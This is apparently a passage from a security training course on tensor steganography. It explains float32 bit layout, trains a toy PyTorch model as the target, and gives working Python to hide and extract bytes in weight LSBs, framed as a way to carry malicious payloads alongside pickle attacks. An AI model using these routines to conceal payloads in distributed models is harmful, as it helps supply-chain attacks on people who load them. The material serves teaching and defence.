The practice of hiding information within the numerical parameters of a neural network model is known as `Tensor Steganography`. This technique leverages the fact that models contain millions, sometimes billions or even trillions, of parameters, typically represented as `floating-point numbers`.

The core idea is to alter the parameters in a way that is statistically inconspicuous and has minimal impact on the model's overall performance, thus avoiding detection. This hidden data might be the malicious payload itself, configuration for malware, or a trigger activated by the code executed via the `pickle` vulnerability. `Tensor steganography`, therefore, serves as a method to use the model's parameters as a data carrier, complementing other vulnerabilities like unsafe deserialization that provide the execution vector. A common approach to achieve this stealthy modification is to alter only the `least significant bits` (`LSBs`) of the floating-point numbers representing the parameters.
## The Structure of Floating-Point Numbers

To understand how LSB modification enables `Tensor steganography`, we need to look at how computers represent decimal numbers. The parameters in `tensors` are most commonly stored as `floating-point numbers`, typically conforming to the `IEEE 754` standard. The `float32` (single-precision) format is frequently used.

For a `float32`, each number is stored using 32 bits allocated to three distinct components according to a standard layout.<p><p>First, the <code>Sign Bit</code>
(<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>s</mi><annotation encoding="application/x-tex">s</annotation></semantics></math>),
which is the <code>most significant bit</code> (<code>MSB</code>)
overall (Bit 31), determines if the number is positive (<code>0</code>)
or negative (<code>1</code>). Second, the <code>Exponent</code>
(<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>E</mi><mrow><mi>s</mi><mi>t</mi><mi>o</mi><mi>r</mi><mi>e</mi><mi>d</mi></mrow></msub><annotation encoding="application/x-tex">E_{stored}</annotation></semantics></math>),
uses the next 8 bits (30 down to 23) to represent the number’s scale or
magnitude, stored with a <code>bias</code> (typically 127 for
<code>float32</code>) to handle both large and small values. The actual
exponent is
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi><mo>=</mo><msub><mi>E</mi><mrow><mi>s</mi><mi>t</mi><mi>o</mi><mi>r</mi><mi>e</mi><mi>d</mi></mrow></msub><mo>−</mo><mtext mathvariant="normal">bias</mtext></mrow><annotation encoding="application/x-tex">E = E_{stored} - \text{bias}</annotation></semantics></math>.
Third, the <code>Mantissa</code> or <code>Significand</code>
(<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>m</mi><annotation encoding="application/x-tex">m</annotation></semantics></math>)
uses the remaining 23 least significant bits (LSBs) (Bit 22 down to 0)
to represent the number’s precision or significant digits. The value is
typically calculated as:</p></p>
<p><p><math display="block" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext mathvariant="normal">Value</mtext><mo>=</mo><mo stretchy="false" form="prefix">(</mo><mi>−</mi><mn>1</mn><msup><mo stretchy="false" form="postfix">)</mo><mi>s</mi></msup><mo>×</mo><mo stretchy="false" form="prefix">(</mo><mn>1</mn><mi>.</mi><mi>m</mi><mo stretchy="false" form="postfix">)</mo><mo>×</mo><msup><mn>2</mn><mrow><mo stretchy="false" form="prefix">(</mo><msub><mi>E</mi><mrow><mi>s</mi><mi>t</mi><mi>o</mi><mi>r</mi><mi>e</mi><mi>d</mi></mrow></msub><mo>−</mo><mtext mathvariant="normal">bias</mtext><mo stretchy="false" form="postfix">)</mo></mrow></msup></mrow><annotation encoding="application/x-tex">\text{Value} = (-1)^s \times (1.m) \times 2^{(E_{stored} - \text{bias})}</annotation></semantics></math></p></p>
<p><p>Here,
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false" form="prefix">(</mo><mn>1</mn><mi>.</mi><mi>m</mi><mo stretchy="false" form="postfix">)</mo></mrow><annotation encoding="application/x-tex">(1.m)</annotation></semantics></math>
represents the implicit leading <code>1</code> combined with the
fractional part represented by the mantissa bits
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>m</mi><annotation encoding="application/x-tex">m</annotation></semantics></math>.
Note that this formula applies to normalized numbers; special
representations exist for zero, infinity, and denormalized numbers, but
the core principle relevant to steganography lies in manipulating the
mantissa bits of typical weight values.</p></p>
<p><p>To make this clearer, let’s break down the float
<code>0.15625</code>. The first step is to represent this decimal number
in binary. We can achieve this through a process of repeated
multiplication of the fractional part by 2. Starting with
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mn>0.15625</mn><annotation encoding="application/x-tex">0.15625</annotation></semantics></math>,
multiplying by 2 gives
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mn>0.3125</mn><annotation encoding="application/x-tex">0.3125</annotation></semantics></math>,
and we note the integer part is <code>0</code>. Taking the new
fractional part,
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0.3125</mn><mo>×</mo><mn>2</mn><mo>=</mo><mn>0.625</mn></mrow><annotation encoding="application/x-tex">0.3125 \times 2 = 0.625</annotation></semantics></math>,
the integer part is again <code>0</code>. Continuing this process,
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0.625</mn><mo>×</mo><mn>2</mn><mo>=</mo><mn>1.25</mn></mrow><annotation encoding="application/x-tex">0.625 \times 2 = 1.25</annotation></semantics></math>,
yielding an integer part of <code>1</code>. We use the remaining
fractional part,
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0.25</mn><mo>×</mo><mn>2</mn><mo>=</mo><mn>0.5</mn></mrow><annotation encoding="application/x-tex">0.25 \times 2 = 0.5</annotation></semantics></math>,
which gives an integer part of <code>0</code>. The final step is
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0.5</mn><mo>×</mo><mn>2</mn><mo>=</mo><mn>1.0</mn></mrow><annotation encoding="application/x-tex">0.5 \times 2 = 1.0</annotation></semantics></math>,
with an integer part of <code>1</code>. By collecting the integer parts
obtained in sequence (<code>0</code>, <code>0</code>, <code>1</code>,
<code>0</code>, <code>1</code>), we form the binary fraction
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mn>0.00101</mn><mn>2</mn></msub><annotation encoding="application/x-tex">0.00101_2</annotation></semantics></math>.
Thus,
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mn>0.15625</mn><mn>10</mn></msub><annotation encoding="application/x-tex">0.15625_{10}</annotation></semantics></math>
is equivalent to
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mn>0.00101</mn><mn>2</mn></msub><annotation encoding="application/x-tex">0.00101_2</annotation></semantics></math>.</p></p>
<p><p>Next, this binary number needs to be <code>normalized</code> for the
IEEE 754 standard. <code>Normalization</code> involves rewriting the
number in the form
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mi>.</mi><msub><mtext mathvariant="normal">fractional_part</mtext><mn>2</mn></msub><mo>×</mo><msup><mn>2</mn><mtext mathvariant="normal">exponent</mtext></msup></mrow><annotation encoding="application/x-tex">1.\text{fractional\_part}_2 \times 2^{\text{exponent}}</annotation></semantics></math>.
To convert
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mn>0.00101</mn><mn>2</mn></msub><annotation encoding="application/x-tex">0.00101_2</annotation></semantics></math>
to this format, we shift the binary point three places to the right,
resulting in
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mn>1.01</mn><mn>2</mn></msub><annotation encoding="application/x-tex">1.01_2</annotation></semantics></math>.
To preserve the original value after shifting right by three places, we
must multiply by
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msup><mn>2</mn><mrow><mi>−</mi><mn>3</mn></mrow></msup><annotation encoding="application/x-tex">2^{-3}</annotation></semantics></math>.
This gives the normalized form
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mn>1.01</mn><mn>2</mn></msub><mo>×</mo><msup><mn>2</mn><mrow><mi>−</mi><mn>3</mn></mrow></msup></mrow><annotation encoding="application/x-tex">1.01_2 \times 2^{-3}</annotation></semantics></math>.</p></p>
<p><p>From this normalized representation, we can directly extract the
components required for the <code>float32</code> format. First, the Sign
bit
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>s</mi><annotation encoding="application/x-tex">s</annotation></semantics></math>
is <code>0</code>, as <code>0.15625</code> is a positive number. Second,
the actual exponent is identified as
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi><mo>=</mo><mi>−</mi><mn>3</mn></mrow><annotation encoding="application/x-tex">E = -3</annotation></semantics></math>,
determined from the
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msup><mn>2</mn><mrow><mi>−</mi><mn>3</mn></mrow></msup><annotation encoding="application/x-tex">2^{-3}</annotation></semantics></math>
factor in the normalized form. The exponent stored in the
<code>float32</code> format uses a bias (127), so the stored exponent is
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mrow><mi>s</mi><mi>t</mi><mi>o</mi><mi>r</mi><mi>e</mi><mi>d</mi></mrow></msub><mo>=</mo><mi>E</mi><mo>+</mo><mtext mathvariant="normal">bias</mtext><mo>=</mo><mi>−</mi><mn>3</mn><mo>+</mo><mn>127</mn><mo>=</mo><mn>124</mn></mrow><annotation encoding="application/x-tex">E_{stored} = E + \text{bias} = -3 + 127 = 124</annotation></semantics></math>.
In binary, this value is <code>01111100</code>. Finally, the mantissa
bits
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>m</mi><annotation encoding="application/x-tex">m</annotation></semantics></math>
are derived from the fractional part following the implicit leading
<code>1</code> in the normalized form
(<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mi>.</mi><msub><munder><mn>01</mn><mo accent="true">_</mo></munder><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">1.\underline{01}_2</annotation></semantics></math>).
These bits start with <code>01</code> and are then padded with trailing
zeros to meet the 23-bit requirement for the mantissa field, giving
<code>01000000000000000000000</code>.</p></p>


The diagram below displays these exact bits (`0 01111100 010...0`) overlaid onto the corresponding fields, boxes separating out the individual bit positions.

![Diagram of IEEE 754 Float32 Bit Structure for 0.15625, showing Sign (1 bit), Exponent (8 bits), and Mantissa (23 bits) with bit positions labeled.](/storage/modules/302/ieee_754.png)

The part that we are interested in for steganography lies within the `mantissa` field (Bits 22 down to 0). The bits towards the left (starting with `0` at Bit 22 in the example) are the `most significant bits` (`MSBs`) of the mantissa, contributing more to the number's value. Conversely, the bits towards the far right (ending with `0` at Bit 0 in the example) are the `least significant bits` (`LSBs`) of the mantissa.

The previous diagram showed the structure for `0.15625`. Now, let's visually compare the effect of flipping different bits within its mantissa. The core idea of LSB steganography relies on the fact that changing the least significant bits has a minimal impact on the overall value, making the change hard to detect. Conversely, changing more significant bits causes a much larger, more obvious alteration.

The following two diagrams illustrate this. We start with our original value `0.15625`.

First, we flip only the LSB of the mantissa (Bit 0).

![Diagram of Float32 LSB Flip (Bit 0) showing original 0.15625 modified to 0.156250014901161, with Sign, Exponent, and Mantissa bit positions labeled.](/storage/modules/302/lsb_flip.png)<p><p>As you can see, flipping Bit 0 resulted in an extremely small change
to the overall value (approximately
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1.49</mn><mo>×</mo><msup><mn>10</mn><mrow><mi>−</mi><mn>8</mn></mrow></msup></mrow><annotation encoding="application/x-tex">1.49 \times 10^{-8}</annotation></semantics></math>).
This magnitude of change is often negligible in the context of deep
learning model weights, potentially falling within the model’s inherent
noise or tolerance levels.</p></p>


Next, we flip the MSB of the mantissa (Bit 22, the leftmost bit within the mantissa field).

![Diagram of Float32 Mantissa MSB Flip (Bit 22) showing original 0.15625 modified to 0.21875, with Sign, Exponent, and Mantissa bit positions labeled.](/storage/modules/302/msb_flip.png)<p><p>Flipping Bit 22 caused a significant jump in the value (a change of
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mn>0.0625</mn><annotation encoding="application/x-tex">0.0625</annotation></semantics></math>).
This change is orders of magnitude larger than flipping the LSB and
would likely alter the model’s behavior noticeably, making it a poor
choice for hiding data stealthily.</p></p>


This comparison clearly demonstrates why LSBs are targeted in steganography. Altering them introduces minimal numerical error, preserving the approximate value and function of the number (like a weight or bias), thus hiding the embedded data effectively. Modifying more significant bits would likely corrupt the model's performance, revealing the tampering.

---

<!-- section 3661 | page 22 | group: Pickles and Steganography | type: interactive -->

# Training SimpleNet

---

To demonstrate the attack, we first need a legitimate model to target. We'll define a simple neural network using PyTorch, train it on some dummy data for a few epochs, and save its learned parameters (`state_dict`).

First, we set up the necessary PyTorch imports and define a simple network architecture. We include a `large_layer` to provide a tensor with ample space for embedding our payload later using steganography, although it's not used in the basic forward pass here for simplicity.

```python
import torch
import torch.nn as nn
import torch.optim as optim
from torch.utils.data import TensorDataset, DataLoader
import numpy as np
import os

# Seed for reproducibility
SEED = 1337
np.random.seed(SEED)
torch.manual_seed(SEED)


# Define a simple Neural Network
class SimpleNet(nn.Module):
    def __init__(self, input_size, hidden_size, output_size):
        super(SimpleNet, self).__init__()
        self.fc1 = nn.Linear(input_size, hidden_size)
        self.relu = nn.ReLU()
        self.fc2 = nn.Linear(hidden_size, output_size)
        # Add a larger layer potentially suitable for steganography later
        self.large_layer = nn.Linear(hidden_size, hidden_size * 5)

    def forward(self, x):
        x = self.fc1(x)
        x = self.relu(x)
        x = self.fc2(x)
        # Note: large_layer is defined but not used in forward pass for simplicity
        # In a real model, all layers would typically be used.
        return x


# Model parameters
input_dim = 10
hidden_dim = 64  # Increased hidden size for larger layers
output_dim = 1
target_model = SimpleNet(input_dim, hidden_dim, output_dim)
```

Next, we print the names, shapes, and number of elements for each parameter tensor in the model's `state_dict`. This helps us identify potential target tensors for steganography later - typically, larger tensors are better candidates.

```python
print("SimpleNet model structure:")
print(target_model)
print("\nModel parameters (state_dict keys and initial values):")
for name, param in target_model.state_dict().items():
    print(f"  {name}: shape={param.shape}, numel={param.numel()}, dtype={param.dtype}")
    if param.numel() > 0:
        print(f"    Initial values (first 3): {param.flatten()[:3].tolist()}")
```

The above will output:

```python
SimpleNet model structure:
SimpleNet(
  (fc1): Linear(in_features=10, out_features=64, bias=True)
  (relu): ReLU()
  (fc2): Linear(in_features=64, out_features=1, bias=True)
  (large_layer): Linear(in_features=64, out_features=320, bias=True)
)

Model parameters (state_dict keys and initial values):
  fc1.weight: shape=torch.Size([64, 10]), numel=640, dtype=torch.float32
    Initial values (first 3): [-0.26669567823410034, -0.002772220876067877, 0.07785409688949585]
  fc1.bias: shape=torch.Size([64]), numel=64, dtype=torch.float32
    Initial values (first 3): [-0.17913953959941864, 0.3102324306964874, 0.20940756797790527]
  fc2.weight: shape=torch.Size([1, 64]), numel=64, dtype=torch.float32
    Initial values (first 3): [0.07556618750095367, 0.07089701294898987, 0.027377665042877197]
  fc2.bias: shape=torch.Size([1]), numel=1, dtype=torch.float32
    Initial values (first 3): [-0.06269672513008118]
  large_layer.weight: shape=torch.Size([320, 64]), numel=20480, dtype=torch.float32
    Initial values (first 3): [-0.006674066185951233, -0.10536490380764008, -0.006343632936477661]
  large_layer.bias: shape=torch.Size([320]), numel=320, dtype=torch.float32
    Initial values (first 3): [0.010662317276000977, -0.06012742221355438, -0.09565037488937378]
```

Now, we create simple synthetic data and perform a minimal training loop. The goal isn't perfect training, but simply to ensure the model's parameters in the `state_dict` are populated with some non-initial values. We use a basic `MSELoss` and the `Adam` optimizer.

```python
# Generate dummy data
num_samples = 100
X_train = torch.randn(num_samples, input_dim)
true_weights = torch.randn(input_dim, output_dim)
y_train = X_train @ true_weights + torch.randn(num_samples, output_dim) * 0.5

# Prepare DataLoader
dataset = TensorDataset(X_train, y_train)
dataloader = DataLoader(dataset, batch_size=16)

# Loss and optimizer
criterion = nn.MSELoss()
optimizer = optim.Adam(target_model.parameters(), lr=0.01)

# Simple training loop
num_epochs = 5 # Minimal training
print(f"\n'Training' the model for {num_epochs} epochs...")
target_model.train() # Set model to training mode
for epoch in range(num_epochs):
    epoch_loss = 0.0
    for inputs, targets in dataloader:
        optimizer.zero_grad()
        outputs = target_model(inputs)
        loss = criterion(outputs, targets)
        loss.backward()
        optimizer.step()
        epoch_loss += loss.item()
    print(f"  Epoch [{epoch+1}/{num_epochs}], Loss: {epoch_loss/len(dataloader):.4f}")

print("Training complete.")
```

With the model now trained, we save its parameters using `torch.save`. This function saves the provided object (here, the `state_dict` dictionary) to a file using Python's `pickle` mechanism. This resulting file is our "legitimate" target.

```python
legitimate_state_dict_file = "target_model.pth"

try:
    # Save the model's state dictionary. torch.save uses pickle internally.
    torch.save(target_model.state_dict(), legitimate_state_dict_file)
    print(f"\nLegitimate model state_dict saved to '{legitimate_state_dict_file}'.")
except Exception as e:
    print(f"\nError saving legitimate state_dict: {e}")

```

## Calculating Storage Capacity

The next piece of the puzzle is to determine exactly how much storage capacity we have to work with, within a model. This capacity is dictated by the size of the chosen tensor(s) and the number of least significant bits designated for modification in each floating-point number within that tensor.
<p><p>Let
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>N</mi><annotation encoding="application/x-tex">N</annotation></semantics></math>
represent the total number of floating-point values present in the
target tensor (e.g., <code>tensor.numel</code>). Let
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>n</mi><annotation encoding="application/x-tex">n</annotation></semantics></math>
be the number of LSBs that will be replaced in each of these
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>N</mi><annotation encoding="application/x-tex">N</annotation></semantics></math>
values (e.g.,
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">n=1</annotation></semantics></math>
or
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>=</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">n=2</annotation></semantics></math>).
The total storage capacity, measured in bits, can be calculated
directly:</p></p>

<p><p><math display="block" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mtext mathvariant="normal">Capacity</mtext><mtext mathvariant="normal">bits</mtext></msub><mo>=</mo><mi>N</mi><mo>×</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">\text{Capacity}_{\text{bits}} = N \times n</annotation></semantics></math></p></p>



To express this capacity in bytes, which is often more practical for relating to file sizes, we divide the total number of bits by 8:
<p><p><math display="block" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mtext mathvariant="normal">Capacity</mtext><mtext mathvariant="normal">bytes</mtext></msub><mo>=</mo><mo stretchy="false" form="prefix">⌊</mo><mfrac><mrow><mi>N</mi><mo>×</mo><mi>n</mi></mrow><mn>8</mn></mfrac><mo stretchy="false" form="postfix">⌋</mo></mrow><annotation encoding="application/x-tex">\text{Capacity}_{\text{bytes}} = \lfloor \frac{N \times n}{8} \rfloor</annotation></semantics></math></p></p>

<p><p>We use the floor function
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false" form="prefix">⌊</mo><mi>…</mi><mo stretchy="false" form="postfix">⌋</mo></mrow><annotation encoding="application/x-tex">\lfloor \dots \rfloor</annotation></semantics></math>
because we can only store whole bytes.</p></p>



## Calculating Storage Capacity for SimpleNet
<p><p>Let’s apply this to our <code>SimpleNet</code> model. From the model
structure output, the <code>large_layer.weight</code> tensor has
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mo>=</mo><mn>20480</mn></mrow><annotation encoding="application/x-tex">N = 20480</annotation></semantics></math>
elements (<code>numel=20480</code>). If we decide to use
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>=</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">n=2</annotation></semantics></math>
LSBs per element (as configured by <code>NUM_LSB = 2</code> in the
attack phase), the available capacity in <code>large_layer.weight</code>
would be:</p></p>

<p><p><math display="block" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mtext mathvariant="normal">Capacity</mtext><mtext mathvariant="normal">bits</mtext></msub><mo stretchy="false" form="prefix">(</mo><mtext mathvariant="normal">SimpleNet large_layer.weight</mtext><mo stretchy="false" form="postfix">)</mo><mo>=</mo><mn>20480</mn><mo>×</mo><mn>2</mn><mo>=</mo><mn>40960</mn><mrow><mspace width="0.333em"></mspace><mtext mathvariant="normal"> bits</mtext></mrow></mrow><annotation encoding="application/x-tex">\text{Capacity}_{\text{bits}} (\text{SimpleNet large\_layer.weight}) = 20480 \times 2 = 40960 \text{ bits}</annotation></semantics></math></p></p>

<p><p><math display="block" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mtext mathvariant="normal">Capacity</mtext><mtext mathvariant="normal">bytes</mtext></msub><mo stretchy="false" form="prefix">(</mo><mtext mathvariant="normal">SimpleNet large_layer.weight</mtext><mo stretchy="false" form="postfix">)</mo><mo>=</mo><mo stretchy="false" form="prefix">⌊</mo><mfrac><mn>40960</mn><mn>8</mn></mfrac><mo stretchy="false" form="postfix">⌋</mo><mo>=</mo><mn>5120</mn><mrow><mspace width="0.333em"></mspace><mtext mathvariant="normal"> bytes</mtext></mrow></mrow><annotation encoding="application/x-tex">\text{Capacity}_{\text{bytes}} (\text{SimpleNet large\_layer.weight}) = \lfloor \frac{40960}{8} \rfloor = 5120 \text{ bytes}</annotation></semantics></math></p></p>

<p><p>So, the <code>large_layer.weight</code> tensor in our
<code>SimpleNet</code> model can store 5120 bytes (or 5 kB) of data if
we use 2 LSBs per floating-point number.</p></p>


---

<!-- section 3662 | page 23 | group: Pickles and Steganography | type: interactive -->

# Steganography Tools

---

To implement `Tensor steganography`, we need to develop two Python functions: `encode_lsb` to embed data within a tensor's `least significant bits` (`LSBs`), and `decode_lsb` to reverse the process, and retrieve it. These two functions rely on the `struct` module for conversions between floating-point numbers and their raw byte representations, which is essential for bit-level manipulation.

```python
import struct
```

## Encoding Logic

The `encode_lsb` function embeds a byte string (`data_bytes`) into the LSBs of a `float32` tensor (`tensor_orig`), using a specified number of bits (`num_lsb`) per tensor element.

We start by defining the function and performing initial validations. These checks ensure the input tensor `tensor_orig` is of the `torch.float32` data type, as our LSB manipulation technique is specific to this format. We also need to confirm that `num_lsb` is within an acceptable range (1 to 8 bits). To prevent modification of the original input, we work only on a `clone` of the tensor.

```python
def encode_lsb(
    tensor_orig: torch.Tensor, data_bytes: bytes, num_lsb: int
) -> torch.Tensor:
    """Encodes byte data into the LSBs of a float32 tensor (prepends length).

    Args:
        tensor_orig: The original float32 tensor.
        data_bytes: The byte string to encode.
        num_lsb: The number of least significant bits (1-8) to use per float.

    Returns:
        A new tensor with the data embedded in its LSBs.

    Raises:
        TypeError: If tensor_orig is not a float32 tensor.
        ValueError: If num_lsb is not between 1 and 8.
        ValueError: If the tensor does not have enough capacity for the data.
    """
    if tensor_orig.dtype != torch.float32:
        raise TypeError("Tensor must be float32.")
    if not 1 <= num_lsb <= 8:
        raise ValueError("num_lsb must be 1-8. More bits increase distortion.")

    tensor = tensor_orig.clone().detach() # Work on a copy
```

Next, we prepare the data for embedding. The tensor is flattened to simplify element-wise iteration. Here, the length of `data_bytes` is determined and then packed as a 4-byte, big-endian unsigned integer using `struct.pack(">I", data_len)`. This length prefix is prepended to `data_bytes` to form `data_to_embed`. This step ensures the decoder can ascertain the exact size of the hidden payload.

```python
    n_elements = tensor.numel()
    tensor_flat = tensor.flatten() # Flatten for easier iteration

    data_len = len(data_bytes)
    # Prepend the length of the data as a 4-byte unsigned integer (big-endian)
    data_to_embed = struct.pack(">I", data_len) + data_bytes
```

A capacity check is then performed. We calculate the `total_bits_needed` for `data_to_embed` (length prefix + payload) and compare this to the tensor's `capacity_bits` (derived from `n_elements * num_lsb`). If the tensor lacks sufficient capacity, a `ValueError` is raised, as attempting to embed the data would fail. This ensures we don't try to write past the available space.

```python
    total_bits_needed = len(data_to_embed) * 8
    capacity_bits = n_elements * num_lsb

    if total_bits_needed > capacity_bits:
        raise ValueError(
            f"Tensor too small: needs {total_bits_needed} bits, but capacity is {capacity_bits} bits. "
            f"Required elements: { (total_bits_needed + num_lsb -1) // num_lsb}, available: {n_elements}."
        )
```

We then initialize variables to manage the bit-by-bit embedding loop: `data_iter` allows iteration over `data_to_embed`, `current_byte` holds the byte being processed, and `bit_index_in_byte` tracks the current bit within that byte (from 7 down to 0), `element_index` points to the current tensor element, and `bits_embedded` counts the total bits successfully stored.

```python
    data_iter = iter(data_to_embed)  # To get bytes one by one
    current_byte = next(data_iter, None)  # Load the first byte
    bit_index_in_byte = 7  # Start from the MSB of the current_byte
    element_index = 0  # Index for tensor_flat
    bits_embedded = 0  # Counter for total bits embedded
```

The main embedding occurs in a `while` loop, processing one tensor element at a time. For each `float32` value, its 32-bit integer representation is obtained using `struct.pack` and `struct.unpack`. A `mask` is created to target the `num_lsb` LSBs, and an inner loop then extracts `num_lsb` bits from `data_to_embed` (via `current_byte` and `bit_index_in_byte`), assembling them into `data_bits_for_float`. This process continues until all payload bits are gathered for the current float or the payload ends.

```python
    while bits_embedded < total_bits_needed and element_index < n_elements:
        if current_byte is None:  # Should not happen if capacity check is correct
            break

        original_float = tensor_flat[element_index].item()
        # Convert float to its 32-bit integer representation
        packed_float = struct.pack(">f", original_float)
        int_representation = struct.unpack(">I", packed_float)[0]

        # Create a mask for the LSBs we want to modify
        mask = (1 << num_lsb) - 1
        data_bits_for_float = 0  # Accumulator for bits to embed in this float

        for i in range(num_lsb):  # For each LSB position in this float
            if current_byte is None:  # No more data bytes
                break
            
            data_bit = (current_byte >> bit_index_in_byte) & 1
            data_bits_for_float |= data_bit << (num_lsb - 1 - i)
            
            bit_index_in_byte -= 1
            if bit_index_in_byte < 0:  # Current byte fully processed
                current_byte = next(data_iter, None) # Get next byte
                bit_index_in_byte = 7  # Reset bit index

            bits_embedded += 1
            if bits_embedded >= total_bits_needed:  # All data embedded
                break
```

With `data_bits_for_float` prepared, we embed these bits into the tensor element. First, the LSBs of the `int_representation` are cleared using a bitwise `AND` with the inverted `mask`. Then, `data_bits_for_float` are merged into these cleared positions using a bitwise `OR`. The resulting `new_int_representation` is converted back to a `float32` value using `struct.pack` and `struct.unpack`. This new float, containing the embedded data bits, replaces the original value in `tensor_flat`. The `element_index` is then incremented.

```python
        # Clear the LSBs of the original float's integer representation
        cleared_int = int_representation & (~mask)
        # Combine the cleared integer with the data bits
        new_int_representation = cleared_int | data_bits_for_float

        # Convert the new integer representation back to a float
        new_packed_float = struct.pack(">I", new_int_representation)
        new_float = struct.unpack(">f", new_packed_float)[0]

        tensor_flat[element_index] = new_float  # Update the tensor
        element_index += 1
```

After the loop finishes, a confirmation message is printed detailing the number of bits encoded and tensor elements used. The modified `tensor` (which reflects changes made to its flattened view, `tensor_flat`) is then returned.

```python
    print(f"Encoded {bits_embedded} bits into {element_index} elements using {num_lsb} LSB(s) per element.")
    return tensor
```

## Decoding Logic

The `decode_lsb` function reverses the encoding, extracting hidden data from a `tensor_modified`. It requires the tensor and the same `num_lsb` value used during encoding.

Initial setup validates the tensor type (`float32`) and `num_lsb` range. The tensor is flattened, and a `shared_state` dictionary is used to manage `element_index` across calls to a nested helper function, ensuring that bit extraction resumes from the correct position in the tensor.

```python
def decode_lsb(tensor_modified: torch.Tensor, num_lsb: int) -> bytes:
    """Decodes byte data hidden in the LSBs of a float32 tensor.
    Assumes data was encoded with encode_lsb (length prepended).

    Args:
        tensor_modified: The float32 tensor containing the hidden data.
        num_lsb: The number of LSBs (1-8) used per float during encoding.

    Returns:
        The decoded byte string.

    Raises:
        TypeError: If tensor_modified is not a float32 tensor.
        ValueError: If num_lsb is not between 1 and 8.
        ValueError: If tensor ends prematurely during decoding or length/payload mismatch.
    """
    if tensor_modified.dtype != torch.float32:
        raise TypeError("Tensor must be float32.")
    if not 1 <= num_lsb <= 8:
        raise ValueError("num_lsb must be 1-8.")

    tensor_flat = tensor_modified.flatten()
    n_elements = tensor_flat.numel()
    shared_state = {'element_index': 0} 
```

The nested `get_bits(count)` function is responsible for extracting a specified `count` of bits from the tensor's LSBs. It iterates through `tensor_flat` elements, starting from `shared_state['element_index']`. For each float, it obtains its integer representation, masks out the `num_lsb` LSBs, and appends these bits to a list until `count` bits are collected, and `shared_state['element_index']` is updated after each element. If the tensor ends before `count` bits are retrieved, a `ValueError` is raised.

```python
    def get_bits(count: int) -> list[int]:
        nonlocal shared_state 
        bits = []
        
        while len(bits) < count and shared_state['element_index'] < n_elements:
            current_float = tensor_flat[shared_state['element_index']].item()
            packed_float = struct.pack(">f", current_float)
            int_representation = struct.unpack(">I", packed_float)[0]

            mask = (1 << num_lsb) - 1
            lsb_data = int_representation & mask 

            for i in range(num_lsb):
                bit = (lsb_data >> (num_lsb - 1 - i)) & 1
                bits.append(bit)
                if len(bits) == count: 
                    break
            
            shared_state['element_index'] += 1 

        if len(bits) < count:
            raise ValueError(
                f"Tensor ended prematurely. Requested {count} bits, got {len(bits)}. "
                f"Processed {shared_state['element_index']} elements."
            )
        return bits
```

Decoding begins by calling `get_bits(32)` to retrieve the 32-bit length prefix. These bits are then converted into an integer, `payload_len_bytes`, representing the length of the hidden payload in bytes. Appropriate error handling is included for this critical step.

```python
    try:
        length_bits = get_bits(32)  # Decode the 32-bit length prefix
    except ValueError as e:
        raise ValueError(f"Failed to decode payload length: {e}")

    payload_len_bytes = 0
    for bit in length_bits:
        payload_len_bytes = (payload_len_bytes << 1) | bit
```

